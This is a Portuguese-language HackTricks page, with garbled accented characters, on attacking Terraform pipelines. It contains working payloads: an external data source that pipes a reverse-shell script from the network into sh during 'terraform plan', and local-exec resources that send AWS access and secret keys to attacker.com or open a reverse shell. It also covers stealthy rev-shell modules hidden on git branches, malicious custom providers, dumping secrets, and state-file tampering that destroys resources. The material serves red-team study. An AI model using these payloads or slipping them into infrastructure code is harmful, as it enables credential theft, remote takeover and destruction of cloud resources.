# Seguran√ßa do Terraform

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

### Informa√ß√µes B√°sicas

[Dos documentos:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform √© uma **ferramenta de infraestrutura como c√≥digo** que permite definir tanto **recursos em nuvem quanto locais** em arquivos de configura√ß√£o leg√≠veis por humanos que voc√™ pode versionar, reutilizar e compartilhar. Voc√™ pode ent√£o usar um fluxo de trabalho consistente para provisionar e gerenciar toda a sua infraestrutura ao longo de seu ciclo de vida. O Terraform pode gerenciar componentes de baixo n√≠vel, como computa√ß√£o, armazenamento e recursos de rede, bem como componentes de alto n√≠vel, como entradas DNS e recursos SaaS.

#### Como o Terraform funciona?

O Terraform cria e gerencia recursos em plataformas de nuvem e outros servi√ßos por meio de suas interfaces de programa√ß√£o de aplicativos (APIs). Os provedores permitem que o Terraform funcione com praticamente qualquer plataforma ou servi√ßo com uma API acess√≠vel.

![](<../.gitbook/assets/image (177).png>)

A HashiCorp e a comunidade Terraform j√° escreveram **mais de 1700 provedores** para gerenciar milhares de tipos diferentes de recursos e servi√ßos, e esse n√∫mero continua a crescer. Voc√™ pode encontrar todos os provedores dispon√≠veis publicamente no [Terraform Registry](https://registry.terraform.io/), incluindo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog e muitos mais.

O fluxo de trabalho central do Terraform consiste em tr√™s etapas:

* **Escrever:** Voc√™ define recursos, que podem estar em v√°rios provedores de nuvem e servi√ßos. Por exemplo, voc√™ pode criar uma configura√ß√£o para implantar um aplicativo em m√°quinas virtuais em uma rede de Nuvem Privada Virtual (VPC) com grupos de seguran√ßa e um balanceador de carga.
* **Planejar:** O Terraform cria um plano de execu√ß√£o descrevendo a infraestrutura que criar√°, atualizar√° ou destruir√° com base na infraestrutura existente e em sua configura√ß√£o.
* **Aplicar:** Ap√≥s a aprova√ß√£o, o Terraform executa as opera√ß√µes propostas na ordem correta, respeitando quaisquer depend√™ncias de recursos. Por exemplo, se voc√™ atualizar as propriedades de uma VPC e mudar o n√∫mero de m√°quinas virtuais nessa VPC, o Terraform recriar√° a VPC antes de escalar as m√°quinas virtuais.

![](<../.gitbook/assets/image (215).png>)

### Laborat√≥rio Terraform

Basta instalar o terraform no seu computador.

Aqui voc√™ tem um [guia](https://learn.hashicorp.com/tutorials/terraform/install-cli) e aqui voc√™ tem a [melhor maneira de baixar o terraform](https://www.terraform.io/downloads).

### RCE no Terraform

O Terraform **n√£o tem uma plataforma que exp√µe uma p√°gina da web ou um servi√ßo de rede** que possamos enumerar, portanto, a √∫nica maneira de comprometer o terraform √© **ser capaz de adicionar/modificar arquivos de configura√ß√£o do terraform**.

No entanto, o terraform √© um **componente muito sens√≠vel** a comprometer porque ter√° **acesso privilegiado** a diferentes locais para que possa funcionar corretamente.

A principal maneira de um atacante conseguir comprometer o sistema onde o terraform est√° sendo executado √© **comprometer o reposit√≥rio que armazena as configura√ß√µes do terraform**, porque em algum momento elas ser√£o **interpretadas**.

Na verdade, existem solu√ß√µes que **executam o terraform plan/apply automaticamente ap√≥s a cria√ß√£o de um PR**, como o **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Se voc√™ conseguir comprometer um arquivo terraform, existem diferentes maneiras de realizar RCE quando algu√©m executa `terraform plan` ou `terraform apply`.

#### Terraform plan

O terraform plan √© o **comando mais utilizado** no terraform e desenvolvedores/solu√ß√µes que usam terraform o chamam o tempo todo, ent√£o a **maneira mais f√°cil de obter RCE** √© garantir que voc√™ envenene um arquivo de configura√ß√£o do terraform que executar√° comandos arbitr√°rios em um `terraform plan`.

**Usando um provedor externo**

O Terraform oferece o [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que fornece uma maneira de interagir entre o Terraform e programas externos. Voc√™ pode usar a fonte de dados `external` para executar c√≥digo arbitr√°rio durante um `plan`.

Injetar em um arquivo de configura√ß√£o do terraform algo como o seguinte executar√° um rev shell ao executar `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Usando um provedor personalizado**

Um atacante poderia enviar um [provedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) para o [Terraform Registry](https://registry.terraform.io/) e ent√£o adicion√°-lo ao c√≥digo Terraform em um branch de recurso ([exemplo daqui](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
O provedor √© baixado no `init` e executar√° o c√≥digo malicioso quando `plan` for executado

Voc√™ pode encontrar um exemplo em [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Usando uma refer√™ncia externa**

Ambas as op√ß√µes mencionadas s√£o √∫teis, mas n√£o muito discretas (a segunda √© mais discreta, mas mais complexa do que a primeira). Voc√™ pode realizar este ataque de uma **maneira mais discreta**, seguindo estas sugest√µes:

* Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que cont√©m o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Voc√™ pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* No recurso externo, use o recurso **ref** para ocultar o **c√≥digo rev shell do terraform em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

#### Terraform Apply

O Terraform apply ser√° executado para aplicar todas as mudan√ßas, voc√™ tamb√©m pode abusar disso para obter RCE injetando **um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar este ataque de uma **maneira mais furtiva usando refer√™ncias externas**.

### Dumps de Segredos

Voc√™ pode ter **valores secretos usados pelo terraform despejados** executando `terraform apply` ao adicionar ao arquivo terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Abusando de Arquivos de Estado do Terraform

Caso voc√™ tenha acesso de escrita sobre arquivos de estado do terraform, mas n√£o possa alterar o c√≥digo do terraform, [**esta pesquisa**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) oferece algumas op√ß√µes interessantes para aproveitar o arquivo:

#### Deletando recursos <a href="#deleting-resources" id="deleting-resources"></a>

Existem 2 maneiras de destruir recursos:

1. **Inserir um recurso com um nome aleat√≥rio no arquivo de estado apontando para o recurso real a ser destru√≠do**

Porque o terraform ver√° que o recurso n√£o deveria existir, ele o destruir√° (seguindo o ID do recurso real indicado). Exemplo da p√°gina anterior:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modifique o recurso para excluir de uma maneira que n√£o seja poss√≠vel atualizar (para que ele seja exclu√≠do e recriado)**

Para uma inst√¢ncia EC2, modificar o tipo da inst√¢ncia √© suficiente para fazer o terraform excluir e recri√°-la.

#### RCE

Tamb√©m √© poss√≠vel [criar um provedor personalizado](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) e simplesmente substituir um dos provedores no arquivo de estado do terraform pelo malicioso ou adicionar um recurso vazio com o provedor malicioso. Exemplo da pesquisa original:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Substituir provedor na lista negra

Caso voc√™ encontre uma situa√ß√£o onde `hashicorp/external` foi colocado na lista negra, voc√™ pode re-implementar o provedor `external` fazendo o seguinte. Nota: Usamos um fork do provedor external publicado por https://registry.terraform.io/providers/nazarewk/external/latest. Voc√™ tamb√©m pode publicar seu pr√≥prio fork ou re-implementa√ß√£o.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ent√£o voc√™ pode usar `external` como de costume.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
### Ferramentas de Auditoria

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec usa an√°lise est√°tica do seu c√≥digo terraform para identificar poss√≠veis configura√ß√µes incorretas.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan √© um analisador de c√≥digo est√°tico para Infraestrutura como C√≥digo.

### Refer√™ncias

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
